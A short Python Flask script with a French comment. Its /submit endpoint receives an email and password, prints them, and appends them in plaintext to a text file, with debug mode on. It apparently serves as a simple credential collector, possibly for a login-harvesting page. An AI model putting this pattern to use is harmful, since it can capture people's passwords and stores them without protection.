from flask import Flask, request
app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    print(f"Email: {email}, Password: {password}")

    # Tu peux enregistrer ça dans un fichier si tu veux
    with open("donnees.txt", "a") as f:
        f.write(f"{email} - {password}\n")

    return {"status": "OK"}, 200

if __name__ == '__main__':
    app.run(debug=True)
